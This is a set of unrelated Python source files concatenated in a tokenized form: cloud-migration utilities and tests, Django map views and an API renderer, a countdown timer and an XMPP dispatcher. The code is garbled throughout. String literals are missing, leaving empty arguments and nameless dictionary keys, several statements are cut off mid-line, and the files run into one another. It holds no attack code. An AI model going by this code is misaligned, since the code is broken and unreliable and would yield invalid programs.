\n 
def copy ( self , context , source_object , destination_object ) : \n 
~~~ src_user = context . cfg . src . ssh_user \n 
dst_user = context . cfg . dst . ssh_user \n 
\n 
src_host = source_object . host \n 
dst_host = destination_object . host \n 
\n 
rr = remote_runner . RemoteRunner ( src_host , src_user ) \n 
\n 
ssh_opts = ( \n 
) \n 
\n 
try : \n 
~~~ progress_view = "" \n 
if files . is_installed ( rr , "pv" ) : \n 
~~~ src_file_size = files . remote_file_size ( rr , source_object . path ) \n 
progress_view = "pv --size {size} --progress | " . format ( \n 
size = src_file_size ) \n 
\n 
~~ copy = ( "dd if={src_file} | {progress_view} " \n 
"ssh {ssh_opts} {dst_user}@{dst_host} " \n 
"\'dd of={dst_device}\'" ) \n 
rr . run ( copy . format ( src_file = source_object . path , \n 
dst_user = dst_user , \n 
dst_host = dst_host , \n 
ssh_opts = ssh_opts , \n 
dst_device = destination_object . path , \n 
progress_view = progress_view ) ) \n 
~~ except remote_runner . RemoteExecutionError as e : \n 
~~~ msg = "Cannot copy {src_object} to {dst_object}: {error}" \n 
msg = msg . format ( src_object = source_object , \n 
dst_object = destination_object , \n 
error = e . message ) \n 
raise CopyFailed ( msg ) \n 
# Copyright (c) 2015 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the License); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an AS IS BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or \n 
# implied. \n 
# See the License for the specific language governing permissions and# \n 
# limitations under the License. \n 
\n 
~~ ~~ ~~ import datetime \n 
import logging \n 
from logging import config \n 
from logging import handlers \n 
import os \n 
import sys \n 
\n 
from fabric import api \n 
from oslo_config import cfg \n 
import yaml \n 
\n 
from cloudferry . lib . utils import sizeof_format \n 
\n 
getLogger = logging . getLogger \n 
CONF = cfg . CONF \n 
\n 
\n 
class StdoutLogger ( object ) : \n 
~~~ """ The wrapper of stdout messages\n    Transfer all messages from stdout to cloudferry.lib.stdout logger.\n\n    """ \n 
def __init__ ( self , name = None ) : \n 
~~~ self . log = logging . getLogger ( name or ) \n 
\n 
~~ def write ( self , message ) : \n 
~~~ message = message . strip ( ) \n 
if message : \n 
~~~ self . log . info ( message ) \n 
\n 
~~ ~~ def flush ( self ) : \n 
~~~ pass \n 
\n 
\n 
~~ ~~ def configure_logging ( log_config = None , debug = None , forward_stdout = None ) : \n 
~~~ """Configure the logging\n\n    Loading logging configuration file which is defined in the general\n    configuration file and configure the logging system.\n    Setting the level of console handler to DEBUG mode if debug option is set\n    as True.\n    Wrap the stdout stream by StdoutLogger.\n    """ \n 
if log_config is None : \n 
~~~ log_config = CONF . migrate . log_config \n 
~~ if debug is None : \n 
~~~ debug = CONF . migrate . debug \n 
~~ if forward_stdout is None : \n 
~~~ forward_stdout = CONF . migrate . forward_stdout \n 
\n 
~~ with open ( log_config , ) as f : \n 
~~~ config . dictConfig ( yaml . load ( f ) ) \n 
~~ if debug : \n 
~~~ logger = logging . getLogger ( ) \n 
for handler in logger . handlers : \n 
~~~ if handler . name == : \n 
~~~ handler . setLevel ( logging . DEBUG ) \n 
~~ ~~ ~~ if forward_stdout : \n 
~~~ sys . stdout = StdoutLogger ( ) \n 
\n 
\n 
~~ ~~ class RunRotatingFileHandler ( handlers . RotatingFileHandler ) : \n 
~~~ """Handler for logging to switch the logging file every run.\n\n    The handler allows to include the scenario and the current datetime into\n    the filename.\n\n    :param filename: The template for filename\n    :param date_format: The template for formatting the current datetime\n    """ \n 
def __init__ ( self , \n 
filename = , \n 
date_format = , \n 
** kwargs ) : \n 
~~~ self . date_format = date_format \n 
max_bytes = sizeof_format . parse_size ( kwargs . pop ( , 0 ) ) \n 
\n 
super ( RunRotatingFileHandler , self ) . __init__ ( \n 
filename = self . get_filename ( filename ) , \n 
maxBytes = max_bytes , \n 
** kwargs ) \n 
\n 
~~ def get_filename ( self , filename ) : \n 
~~~ """Format the filename\n\n        :param filename: the formatting string for the filename\n        :return: Formatted filename with included scenario and\n        current datetime.\n        """ \n 
if hasattr ( CONF , ) and hasattr ( CONF . migrate , ) : \n 
~~~ scenario_filename = os . path . basename ( CONF . migrate . scenario ) \n 
scenario = os . path . splitext ( scenario_filename ) [ 0 ] \n 
~~ else : \n 
~~~ scenario = \n 
~~ dt = datetime . datetime . now ( ) . strftime ( self . date_format ) \n 
return filename % { \n 
: scenario , \n 
: dt \n 
} \n 
\n 
\n 
~~ ~~ class CurrentTaskFilter ( logging . Filter ) : \n 
~~~ """Define the current_task variable for the log messages.\n\n    :param name_format: The format of current task name.\n    Default value is %(name)s\n    """ \n 
\n 
def __init__ ( self , name_format = , ** kwargs ) : \n 
~~~ super ( CurrentTaskFilter , self ) . __init__ ( ** kwargs ) \n 
self . name_format = name_format \n 
\n 
~~ def filter ( self , record ) : \n 
~~~ current_task = self . name_format % { \n 
: api . env . current_task or , \n 
} \n 
record . current_task = current_task \n 
return True \n 
# Copyright (c) 2015 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the License); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an AS IS BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or \n 
# implied. \n 
# See the License for the specific language governing permissions and# \n 
# limitations under the License. \n 
\n 
~~ ~~ """\nThis is module to verify if rollback procedure was executed correctly.\nBasically two dictionaries are being compared:\n    - pre_data: data collected from SRC and DST clusters, is being stored in\n                file with name which is described in config file.\n    - data_after: data collected from SRC and DST clusters using data_collector\n                  module, it is being stored in memory as dictionary.\n""" \n 
\n 
import os \n 
import yaml \n 
\n 
import cloudferry_devlab . tests . config as config \n 
from cloudferry_devlab . tests . data_collector import DataCollector \n 
from cloudferry_devlab . tests import functional_test \n 
import cloudferry_devlab . tests . utils as utils \n 
\n 
\n 
class RollbackVerification ( functional_test . FunctionalTest ) : \n 
\n 
~~~ def setUp ( self ) : \n 
~~~ data_collector = DataCollector ( config = config ) \n 
\n 
self . data_after = utils . convert ( data_collector . data_collector ( ) ) \n 
\n 
file_name = config . rollback_params [ ] [ ] \n 
pre_file_path = os . path . join ( self . cloudferry_dir , file_name ) \n 
with open ( pre_file_path , "r" ) as f : \n 
~~~ self . pre_data = yaml . load ( f ) \n 
\n 
~~ ~~ def test_verify_rollback ( self ) : \n 
~~~ """Validate rollback actions run successfuly.""" \n 
self . maxDiff = None \n 
msg = \'Comparing "{0}-{1}" resources...\' \n 
for cloud in self . data_after : \n 
~~~ for service in self . data_after [ cloud ] : \n 
~~~ for resource in self . data_after [ cloud ] [ service ] : \n 
~~~ print ( msg . format ( service . lower ( ) , resource . lower ( ) ) ) \n 
self . assertEqual ( self . data_after [ cloud ] [ service ] [ resource ] , \n 
self . pre_data [ cloud ] [ service ] [ resource ] ) \n 
# Copyright 2014: Mirantis Inc. \n 
# All Rights Reserved. \n 
# \n 
#    Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
#    not use this file except in compliance with the License. You may obtain \n 
#    a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#    Unless required by applicable law or agreed to in writing, software \n 
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
#    License for the specific language governing permissions and limitations \n 
#    under the License. \n 
\n 
\n 
~~ ~~ ~~ ~~ ~~ import mock \n 
\n 
from cloudferry . lib . os . actions import convert_volume_to_image \n 
from cloudferry . lib . utils import utils \n 
from tests import test \n 
\n 
\n 
class ConverterVolumeToImageTest ( test . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ super ( ConverterVolumeToImageTest , self ) . setUp ( ) \n 
self . fake_src_cloud = mock . Mock ( ) \n 
self . fake_storage = mock . Mock ( ) \n 
self . fake_storage . deploy = mock . Mock ( ) \n 
self . fake_storage . upload_volume_to_image . return_value = ( \n 
, ) \n 
self . fake_storage . get_backend . return_value = \n 
self . fake_image = mock . Mock ( ) \n 
self . fake_image . wait_for_status = mock . Mock ( ) \n 
self . fake_image . get_image_by_id_converted = mock . Mock ( ) \n 
self . fake_image . get_image_by_id_converted . return_value = { \n 
: { \n 
: { : , : { } } } } \n 
self . fake_image . patch_image = mock . Mock ( ) \n 
self . fake_src_cloud . resources = { : self . fake_storage , \n 
: self . fake_image } \n 
self . fake_volumes_info = { \n 
: { \n 
: { \n 
: { \n 
: , \n 
: , \n 
\n 
} , \n 
: { \n 
: , \n 
} , \n 
} } , \n 
} \n 
\n 
self . fake_dst_cloud = mock . Mock ( ) \n 
self . fake_config = utils . ext_dict ( migrate = utils . ext_dict ( \n 
{ : , \n 
: } ) ) \n 
\n 
self . fake_init = { \n 
: self . fake_src_cloud , \n 
: self . fake_dst_cloud , \n 
: self . fake_config \n 
} \n 
\n 
~~ def test_action ( self ) : \n 
~~~ fake_action = convert_volume_to_image . ConvertVolumeToImage ( \n 
self . fake_init , \n 
cloud = ) \n 
res = fake_action . run ( self . fake_volumes_info ) \n 
\n 
self . assertEqual ( , \n 
res [ ] [ ] [ ] [ ] ) \n 
\n 
self . assertEqual ( , \n 
res [ ] [ ] [ ] [ ] [ \n 
] [ ] ) \n 
# Copyright 2015 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
~~ ~~ from cloudferry . lib . utils . cache import Memoized , Cached \n 
\n 
from tests import test \n 
\n 
\n 
class MemoizationTestCase ( test . TestCase ) : \n 
~~~ def test_treats_self_as_separate_objects ( self ) : \n 
~~~ class C ( object ) : \n 
~~~ def __init__ ( self , i ) : \n 
~~~ self . i = i \n 
\n 
~~ @ Memoized \n 
def get_i ( self ) : \n 
~~~ return self . i \n 
\n 
~~ ~~ o1 = C ( 1 ) \n 
o2 = C ( 2 ) \n 
\n 
self . assertNotEqual ( o1 . get_i ( ) , o2 . get_i ( ) ) \n 
self . assertEqual ( o1 . get_i ( ) , 1 ) \n 
self . assertEqual ( o2 . get_i ( ) , 2 ) \n 
\n 
~~ def test_takes_value_from_cache ( self ) : \n 
~~~ class C ( object ) : \n 
~~~ def __init__ ( self , i ) : \n 
~~~ self . i = i \n 
\n 
~~ @ Memoized \n 
def get_i ( self ) : \n 
~~~ return self . i \n 
\n 
~~ def set_i ( self , i ) : \n 
~~~ self . i = i \n 
\n 
~~ ~~ original = 1 \n 
o = C ( original ) \n 
self . assertEqual ( o . get_i ( ) , original ) \n 
o . set_i ( 10 ) \n 
self . assertEqual ( o . get_i ( ) , original ) \n 
\n 
\n 
~~ ~~ class CacheTestCase ( test . TestCase ) : \n 
~~~ def test_resets_cache_when_modifier_called ( self ) : \n 
~~~ @ Cached ( getter = , modifier = ) \n 
class C ( object ) : \n 
~~~ def __init__ ( self , i ) : \n 
~~~ self . i = i \n 
\n 
~~ def get_i ( self ) : \n 
~~~ return self . i \n 
\n 
~~ def set_i ( self , i ) : \n 
~~~ self . i = i \n 
\n 
~~ ~~ o = C ( 1 ) \n 
self . assertEqual ( o . get_i ( ) , 1 ) \n 
\n 
o . set_i ( 100 ) \n 
self . assertEqual ( o . get_i ( ) , 100 ) \n 
# Create your views here. \n 
~~ ~~ from django . http import HttpResponse , HttpResponseRedirect , HttpResponseNotFound \n 
from django . template import Context , loader \n 
from django . core . urlresolvers import reverse \n 
from django . template import RequestContext \n 
from django . shortcuts import get_object_or_404 , render_to_response \n 
from django . core . exceptions import ObjectDoesNotExist \n 
from datetime import datetime \n 
from tagging . models import Tag , TaggedItem \n 
from django . views . decorators . csrf import csrf_exempt \n 
from django . contrib . auth . models import User \n 
from django . contrib . auth . decorators import login_required \n 
from django . contrib . auth import authenticate , login \n 
from django . core . mail import send_mail \n 
from django . conf import settings \n 
from django . http import Http404 \n 
from django . db . models import Q \n 
import json \n 
\n 
from openwatch . recordings . models import Recording \n 
from openwatch import recording_tags \n 
\n 
\n 
@ login_required \n 
def moderate ( request ) : \n 
~~~ \n 
\n 
response_values = { } \n 
\n 
org_tag = request . user . get_profile ( ) . org_tag \n 
\n 
if not request . user . is_superuser and ( not request . user . get_profile ( ) . can_moderate or org_tag == ~~~ raise Http404 \n 
\n 
~~ if recording_tags . ACLU_NJ in org_tag : \n 
# Center on New Jersey \n 
~~~ location = { } \n 
location [ ] = 40.167274 \n 
location [ ] = - 74.616338 \n 
response_values [ ] = location \n 
\n 
~~ response_values [ ] = \n 
\n 
return render_to_response ( , response_values , context_instance = RequestContext ( request \n 
\n 
\n 
~~ def map ( request ) : \n 
#total = len(featureset) \n 
~~~ total = "lots!" \n 
return render_to_response ( , { : total } , context_instance = RequestContext ( request ) \n 
# def map_zipcode(request, zipcode): \n 
#     #total = len(featureset) \n 
#     total = ">40000" \n 
#     try: \n 
#         location = Location.objects.get(zipcode=zipcode) \n 
#     except: \n 
\n 
\n 
~~ def size ( request ) : \n 
~~~ featureset = Recording . objects . filter ( ~ Q ( lat = None ) , ~ Q ( lon = None ) , ~ Q ( jtype = ) ) . exclude ( location__exact total = len ( featureset ) \n 
return render_to_response ( , { : total } , context_instance = RequestContext ( request ) \n 
~~ def redir ( self ) : \n 
~~~ return HttpResponseRedirect ( ) \n 
\n 
# def map_tag(request, tag=None): \n 
\n 
#     #0 Responses \n 
#     try: \n 
#         query_tag = Tag.objects.get(name=tag) \n 
#     except Exception, e: \n 
\n 
#     entries = TaggedItem.objects.get_by_model(Recording, query_tag) \n 
\n 
\n 
\n 
\n 
~~ def map_json ( request ) : \n 
~~~ featureset = Recording . objects . all ( ) . order_by ( ) . filter ( ~ Q ( location = ) ) . exclude ( location__isnull resp = encode_queryset ( featureset ) \n 
return HttpResponse ( resp , mimetype = "application/json" ) \n 
\n 
\n 
~~ @ login_required \n 
def map_json_moderate ( request ) : \n 
# If moderating, only return recordings that are not org-approved \n 
\n 
~~~ org_tag = request . user . get_profile ( ) . org_tag \n 
if org_tag != : \n 
\n 
~~~ featureset = Recording . objects . filter ( org_approved = False , org_flagged = False , tags__contains = ~~ else : \n 
~~~ featureset = Recording . objects . all ( ) \n 
\n 
~~ featureset = featureset . order_by ( ) . filter ( ~ Q ( location = ) ) . exclude ( location__isnull = True ) resp = encode_queryset ( featureset ) \n 
return HttpResponse ( resp , mimetype = "application/json" ) \n 
\n 
# def map_tag_json(request, tag): \n 
\n 
#     #0 Responses \n 
#     try: \n 
#         query_tag = Tag.objects.get(name=tag) \n 
#     except Exception, e: \n 
#         return HttpResponse("{\\"objects\\":[]}", mimetype="application/json") \n 
\n 
#     entries = TaggedItem.objects.get_by_model(Recording, query_tag) \n 
\n 
\n 
#     resp = encode_queryset(featureset) \n 
#     return HttpResponse(resp, mimetype="application/json") \n 
\n 
\n 
# def map_tag_location(request, tag=None, ne_lat=0, ne_lon=0, sw_lat=0, sw_lon=0): \n 
\n 
#     ne_lat = float(ne_lat) \n 
#     ne_lon = float(ne_lon) \n 
#     sw_lat = float(sw_lat) \n 
#     sw_lon = float(sw_lon) \n 
\n 
#     #0 Responses \n 
#     try: \n 
#         query_tag = Tag.objects.get(name=tag) \n 
#     except Exception, e: \n 
\n 
#     entries = TaggedItem.objects.get_by_model(Recording, query_tag) \n 
\n 
\n 
\n 
~~ def map_location_json ( request , ne_lat = 0 , ne_lon = 0 , sw_lat = 0 , sw_lon = 0 ) : \n 
\n 
~~~ ne_lat = float ( ne_lat ) \n 
ne_lon = float ( ne_lon ) \n 
sw_lat = float ( sw_lat ) \n 
sw_lon = float ( sw_lon ) \n 
\n 
featureset = Recording . objects . filter ( lat__lt = ne_lat , lat__gt = sw_lat , lon__lt = ne_lon , lon__gt = sw_lon \n 
if len ( featureset ) < 1 : \n 
~~~ return HttpResponse ( "{\\"objects\\":[]}" , mimetype = "application/json" ) \n 
\n 
~~ resp = encode_queryset ( featureset ) \n 
return HttpResponse ( resp , mimetype = "application/json" ) \n 
\n 
# def about(request): \n 
\n 
\n 
# Encoders \n 
\n 
~~ def encode_queryset ( featureset ) : \n 
~~~ resp = \'{"objects":[\' \n 
for obj in featureset : \n 
~~~ resp = resp + json . dumps ( obj . to_dict ( ) ) + \n 
~~ resp = resp [ : - 1 ] + \n 
\n 
return resp """\n\nThis is based off of Django\'s own shorcuts.py which provides render_to_response.\n\nThe key function here is easy_api_render_to_response()\n\n""" \n 
~~ from django . template import loader , RequestContext \n 
from django . http import HttpResponse , Http404 \n 
from django . http import HttpResponseRedirect , HttpResponsePermanentRedirect \n 
from django . db . models . base import ModelBase \n 
from django . db . models . manager import Manager \n 
from django . db . models . query import QuerySet \n 
from django . core import urlresolvers \n 
from django . utils import six \n 
\n 
import datetime \n 
try : \n 
~~~ import json \n 
~~ except Exception , e : \n 
~~~ import simplejson as json # Support for older Python \n 
\n 
~~ from . dumper import DataDumper # Probably can be deprecated. \n 
from dicttoxml import dicttoxml as dict2xml # Requirest dict2xml dep. \n 
from xml . dom . minidom import parseString # For prettyfication \n 
import yaml \n 
\n 
def render_to_easy_api_response ( * args , ** kwargs ) : \n 
~~~ """\n    Returns a HttpResponse whose content is filled with the result of calling\n    django.template.loader.render_to_string() with the passed arguments.\n    """ \n 
httpresponse_kwargs = { : kwargs . pop ( , None ) } \n 
\n 
# This is really quite hacky. \n 
context = kwargs . pop ( ) \n 
processors = context . context_processors \n 
request = processors [ ] [ ] \n 
\n 
if request . GET . has_key ( ) : \n 
~~~ api_type = request . GET [ ] \n 
\n 
# Better solutions welcome! \n 
for arg in args : \n 
~~~ passed = arg \n 
\n 
~~ dump_me = { } \n 
for key in passed . keys ( ) : \n 
~~~ value = passed [ key ] \n 
dump_me [ key ] = dump_object ( value ) \n 
\n 
~~ if api_type == : \n 
\n 
# The XML parser chokes on spaces in key names. \n 
# This recursively replaces them with underscores. \n 
~~~ def replace_spaces ( dump_me ) : \n 
~~~ new = { } \n 
for k , v in dump_me . iteritems ( ) : \n 
~~~ if isinstance ( v , dict ) : \n 
~~~ v = replace_spaces ( v ) \n 
~~ new [ k . replace ( , ) ] = v \n 
~~ return new \n 
\n 
~~ new = replace_spaces ( dump_me ) \n 
dump_me = dict2xml ( new ) \n 
\n 
dom = parseString ( dump_me ) # I love pretty APIs! \n 
pretty = dom . toprettyxml ( ) \n 
return HttpResponse ( pretty , content_type = ) \n 
~~ if api_type == : \n 
~~~ yml = yaml . safe_dump ( dump_me ) \n 
return HttpResponse ( yml , content_type = ) \n 
~~ else : \n 
~~~ dump_me = json . dumps ( dump_me , indent = 2 ) # Indents for pretty \n 
return HttpResponse ( dump_me , content_type = ) \n 
\n 
~~ ~~ return HttpResponse ( loader . render_to_string ( * args , ** kwargs ) , ** httpresponse_kwargs ) \n 
\n 
~~ def render_to_response ( * args , ** kwargs ) : \n 
~~~ """\n    This is just a wrapper around render_to_easy_api_response to make it easier to use as a drop-in replacement.\n    """ \n 
\n 
return render_to_easy_api_response ( * args , ** kwargs ) \n 
\n 
### \n 
# \n 
# Serializers stuff. Mostly stolen from what I did making django-knockout-modeler. \n 
# \n 
## \n 
\n 
~~ def dump_object ( queryset ) : \n 
\n 
# Nasty. \n 
~~~ if str ( type ( queryset ) ) != "<class \'django.db.models.query.QuerySet\'>" : \n 
~~~ d = DataDumper ( ) \n 
ret = d . dump ( queryset ) \n 
return ret \n 
\n 
~~ try : \n 
~~~ modelName = queryset [ 0 ] . __class__ . __name__ \n 
modelNameData = [ ] \n 
\n 
fields = get_fields ( queryset [ 0 ] ) \n 
\n 
for obj in queryset : \n 
~~~ temp_dict = dict ( ) \n 
for field in fields : \n 
~~~ try : \n 
~~~ attribute = getattr ( obj , str ( field ) ) \n 
\n 
# Should sanitization be up to the API consumer? Probably. \n 
# if not safe: \n 
#     if isinstance(attribute, basestring): \n 
#         attribute = cgi.escape(attribute) \n 
\n 
temp_dict [ field ] = attribute \n 
~~ except Exception , e : \n 
~~~ continue \n 
~~ ~~ modelNameData . append ( temp_dict ) \n 
\n 
~~ dthandler = lambda obj : obj . isoformat ( ) if isinstance ( obj , datetime . datetime ) or isinstance return json . loads ( json . dumps ( modelNameData , default = dthandler ) ) \n 
~~ except Exception , e : \n 
~~~ return \n 
\n 
~~ ~~ def get_fields ( model ) : \n 
\n 
~~~ try : \n 
~~~ if hasattr ( model , "easy_api_fields" ) : \n 
~~~ fields = model . easy_api_fields ( ) \n 
~~ else : \n 
~~~ try : \n 
~~~ fields = model . to_dict ( ) . keys ( ) \n 
~~ except Exception , e : \n 
~~~ fields = model . _meta . get_all_field_names ( ) \n 
\n 
~~ ~~ return fields \n 
\n 
# Crash proofing \n 
~~ except Exception , e : \n 
~~~ return [ ] \n 
~~ ~~ class SimpleEngagementCalculator ( object ) : \n 
\n 
~~~ def calculate_user_engagement_score ( self , user , start_date , end_date ) : \n 
~~~ return 0 \n 
\n 
~~ ~~ ROOT_URLCONF = None \n 
DATABASE_ENGINE = \n 
DATABASE_NAME = \n 
DATABASE_SUPPORTS_TRANSACTIONS = False \n 
INSTALLED_APPS = [ \n 
, \n 
, \n 
, \n 
, \n 
] \n 
TEMPLATE_CONTEXT_PROCESSORS = ( \n 
"django.core.context_processors.auth" , \n 
"django.core.context_processors.debug" , \n 
"django.core.context_processors.i18n" , \n 
"django.core.context_processors.media" , \n 
"django.core.context_processors.request" ) \n 
\n 
#!/usr/bin/env python \n 
import os \n 
import sys \n 
\n 
if __name__ == "__main__" : \n 
~~~ os . environ . setdefault ( "DJANGO_SETTINGS_MODULE" , "test_settings" ) \n 
\n 
from django . core . management import execute_from_command_line \n 
\n 
is_testing = in sys . argv \n 
\n 
if is_testing : \n 
~~~ import coverage \n 
cov = coverage . coverage ( include = "django_zappa/*" , omit = [ ] ) \n 
cov . erase ( ) \n 
cov . start ( ) \n 
\n 
~~ execute_from_command_line ( sys . argv ) \n 
\n 
if is_testing : \n 
~~~ cov . stop ( ) \n 
cov . save ( ) \n 
cov . report ( ) \n 
~~ ~~ import datetime \n 
import time \n 
\n 
\n 
class CountdownManager ( object ) : \n 
~~~ def __init__ ( self , root_tk_app ) : \n 
~~~ self . start_time = time . time ( ) \n 
self . minutes = 0 \n 
self . seconds = 0 \n 
self . time_change_callbacks = [ ] \n 
self . count_down_total = datetime . timedelta ( days = - 1 , minutes = 0 , seconds = 0 ) \n 
\n 
self . root_tk_app = root_tk_app \n 
self . refresh_timer ( ) \n 
\n 
~~ def set_countdown_duration ( self , minutes , seconds ) : \n 
~~~ self . start_time = time . time ( ) \n 
self . minutes = minutes \n 
self . seconds = seconds \n 
self . count_down_total = datetime . timedelta ( minutes = minutes , seconds = seconds ) \n 
self . fire_time_change_callbacks ( ) \n 
\n 
~~ def subscribe_to_time_changes ( self , time_change_callback ) : \n 
~~~ self . time_change_callbacks . append ( time_change_callback ) \n 
\n 
~~ def fire_time_change_callbacks ( self ) : \n 
~~~ end_time = time . time ( ) \n 
up_time = end_time - self . start_time \n 
remaining_time = self . count_down_total - datetime . timedelta ( seconds = ( int ( up_time ) ) ) \n 
for callback in self . time_change_callbacks : \n 
~~~ if callback : \n 
~~~ callback ( remaining_time . days , ( remaining_time . seconds // 60 ) % 60 , remaining_time . seconds \n 
~~ ~~ ~~ def refresh_timer ( self ) : \n 
~~~ self . fire_time_change_callbacks ( ) \n 
if self . root_tk_app : \n 
~~~ self . root_tk_app . after ( 500 , self . refresh_timer ) ##   transports.py \n 
## \n 
##   Copyright (C) 2003-2005 Alexey "Snake" Nezhdanov \n 
## \n 
##   This program is free software; you can redistribute it and/or modify \n 
##   it under the terms of the GNU General Public License as published by \n 
##   the Free Software Foundation; either version 2, or (at your option) \n 
##   any later version. \n 
## \n 
##   This program is distributed in the hope that it will be useful, \n 
##   but WITHOUT ANY WARRANTY; without even the implied warranty of \n 
##   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the \n 
##   GNU General Public License for more details. \n 
\n 
# $Id: dispatcher.py,v 1.42 2007/05/18 23:18:36 normanr Exp $ \n 
\n 
~~ ~~ ~~ """\nMain xmpppy mechanism. Provides library with methods to assign different handlers\nto different XMPP stanzas.\nContains one tunable attribute: DefaultTimeout (25 seconds by default). It defines time that \nDispatcher.SendAndWaitForResponce method will wait for reply stanza before giving up.\n""" \n 
\n 
import simplexml , time , sys \n 
from protocol import * \n 
from client import PlugIn \n 
\n 
DefaultTimeout = 25 \n 
ID = 0 \n 
\n 
class Dispatcher ( PlugIn ) : \n 
~~~ """ Ancestor of PlugIn class. Handles XMPP stream, i.e. aware of stream headers.\n        Can be plugged out/in to restart these headers (used for SASL f.e.). """ \n 
def __init__ ( self ) : \n 
~~~ PlugIn . __init__ ( self ) \n 
DBG_LINE = \n 
self . handlers = { } \n 
self . _expected = { } \n 
self . _defaultHandler = None \n 
self . _pendingExceptions = [ ] \n 
self . _eventHandler = None \n 
self . _cycleHandlers = [ ] \n 
self . _exported_methods = [ self . Process , self . RegisterHandler , self . RegisterDefaultHandler , self . RegisterEventHandler , self . UnregisterCycleHandler , self . RegisterCycleHandler , self . RegisterHandlerOnce , self . UnregisterHandler , self . RegisterProtocol , self . WaitForResponse , self . SendAndWaitForResponse , self . send , self . disconnect , self . SendAndCallForResponse , ] \n 
\n 
~~ def dumpHandlers ( self ) : \n 
~~~ """ Return set of user-registered callbacks in it\'s internal format.\n            Used within the library to carry user handlers set over Dispatcher replugins. """ \n 
return self . handlers \n 
~~ def restoreHandlers ( self , handlers ) : \n 
~~~ """ Restores user-registered callbacks structure from dump previously obtained via dumpHandlers.\n            Used within the library to carry user handlers set over Dispatcher replugins. """ \n 
self . handlers = handlers \n 
\n 
~~ def _init ( self ) : \n 
~~~ """ Registers default namespaces/protocols/handlers. Used internally.  """ \n 
self . RegisterNamespace ( ) \n 
self . RegisterNamespace ( NS_STREAMS ) \n 
self . RegisterNamespace ( self . _owner . defaultNamespace ) \n 
self . RegisterProtocol ( , Iq ) \n 
self . RegisterProtocol ( , Presence ) \n 
self . RegisterProtocol ( , Message ) \n 
self . RegisterDefaultHandler ( self . returnStanzaHandler ) \n 
self . RegisterHandler ( , self . streamErrorHandler , xmlns = NS_STREAMS ) \n 
\n 
~~ def plugin ( self , owner ) : \n 
~~~ """ Plug the Dispatcher instance into Client class instance and send initial stream header. Used internally.""" self . _init ( ) \n 
for method in self . _old_owners_methods : \n 
~~~ if method . __name__ == : self . _owner_send = method ; break \n 
~~ self . _owner . lastErrNode = None \n 
self . _owner . lastErr = None \n 
self . _owner . lastErrCode = None \n 
self . StreamInit ( ) \n 
\n 
~~ def plugout ( self ) : \n 
~~~ """ Prepares instance to be destructed. """ \n 
self . Stream . dispatch = None \n 
self . Stream . DEBUG = None \n 
self . Stream . features = None \n 
self . Stream . destroy ( ) \n 
\n 
~~ def StreamInit ( self ) : \n 
~~~ """ Send an initial stream header. """ \n 
self . Stream = simplexml . NodeBuilder ( ) \n 
self . Stream . _dispatch_depth = 2 \n 
self . Stream . dispatch = self . dispatch \n 
self . Stream . stream_header_received = self . _check_stream_start \n 
self . _owner . debug_flags . append ( simplexml . DBG_NODEBUILDER ) \n 
self . Stream . DEBUG = self . _owner . DEBUG \n 
self . Stream . features = None \n 
self . _metastream = Node ( ) \n 
self . _metastream . setNamespace ( self . _owner . Namespace ) \n 
self . _metastream . setAttr ( , ) \n 
self . _metastream . setAttr ( , NS_STREAMS ) \n 
self . _metastream . setAttr ( , self . _owner . Server ) \n 
self . _owner . send ( "<?xml version=\'1.0\'?>%s>" % str ( self . _metastream ) [ : - 2 ] ) \n 
\n 
~~ def _check_stream_start ( self , ns , tag , attrs ) : \n 
~~~ if ns < > NS_STREAMS or tag < > : \n 
~~~ raise ValueError ( % ( tag , ns ) ) \n 
\n 
~~ ~~ def Process ( self , timeout = 0 ) : \n 
~~~ """ Check incoming stream for data waiting. If "timeout" is positive - block for as max. this time.\n            Returns:\n            1) length of processed data if some data were processed;\n            2) \'0\' string if no data were processed but link is alive;\n            3) 0 (zero) if underlying connection is closed.\n            Take note that in case of disconnection detect during Process() call\n            disconnect handlers are called automatically.\n        """ \n 
for handler in self . _cycleHandlers : handler ( self ) \n 
if len ( self . _pendingExceptions ) > 0 : \n 
~~~ _pendingException = self . _pendingExceptions . pop ( ) \n 
raise _pendingException [ 0 ] , _pendingException [ 1 ] , _pendingException [ 2 ] \n 
~~ if self . _owner . Connection . pending_data ( timeout ) : \n 
~~~ try : data = self . _owner . Connection . receive ( ) \n 
except IOError : return \n 
self . Stream . Parse ( data ) \n 
if len ( self . _pendingExceptions ) > 0 : \n 
~~~ _pendingException = self . _pendingExceptions . pop ( ) \n 
raise _pendingException [ 0 ] , _pendingException [ 1 ] , _pendingException [ 2 ] \n 
~~ if data : return len ( data ) \n 
~~ return # It means that nothing is received but link is alive. \n 
\n 
~~ def RegisterNamespace ( self , xmlns , order = ) : \n 
~~~ """ Creates internal structures for newly registered namespace.\n            You can register handlers for this namespace afterwards. By default one namespace\n            already registered (jabber:client or jabber:component:accept depending on context. """ \n 
self . DEBUG ( \'Registering namespace "%s"\' % xmlns , order ) \n 
self . handlers [ xmlns ] = { } \n 
